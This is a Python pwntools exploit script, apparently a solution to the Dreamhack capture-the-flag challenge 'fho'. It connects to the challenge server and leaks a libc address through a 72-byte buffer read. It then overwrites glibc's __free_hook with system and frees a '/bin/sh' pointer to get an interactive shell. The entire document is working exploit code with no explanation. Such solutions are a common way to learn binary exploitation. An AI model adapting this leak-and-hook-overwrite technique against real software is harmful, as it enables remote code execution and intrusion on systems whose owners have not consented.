from pwn import *

context.log_level = 'debug'

context.binary = exe = ELF('./fho', checksec=False)

r = remote('host3.dreamhack.games', 24203)
#r = process(exe.path)
libc = ELF('./libc-2.27.so', checksec=False)
#libc  = exe.libc
r.recvuntil(b'Buf: ')
r.send(b'a'*72)
r.recvuntil(b'Buf: ' + b'a'*72)

libc_start_231 = u64(r.recvn(6) + b'\x00\x00')
#log.info("The libc_start_main + 231 leak: " + hex(libc_start_231))
libc.address = libc_start_231 - 231 - libc.sym['__libc_start_main']
binsh = next(libc.search(b'/bin/sh\x00'))
system_addr  = libc.sym['system']
__free_hook = libc.sym['__free_hook']
log.info("The address of libc leak: " + hex(libc.address))
log.info("The address of \"/bin/sh\" leak: " + hex(binsh))
log.info("The address of system leak: " + hex(system_addr))
log.info("The address of __free_hook leak: " + hex(__free_hook))
r.recvuntil(b'To write: ')
r.sendline(str(__free_hook).encode())
r.recvuntil(b'With: ')
r.sendline(str(system_addr).encode())
r.recvuntil(b'To free: ')
r.sendline(str(binsh).encode())


r.interactive()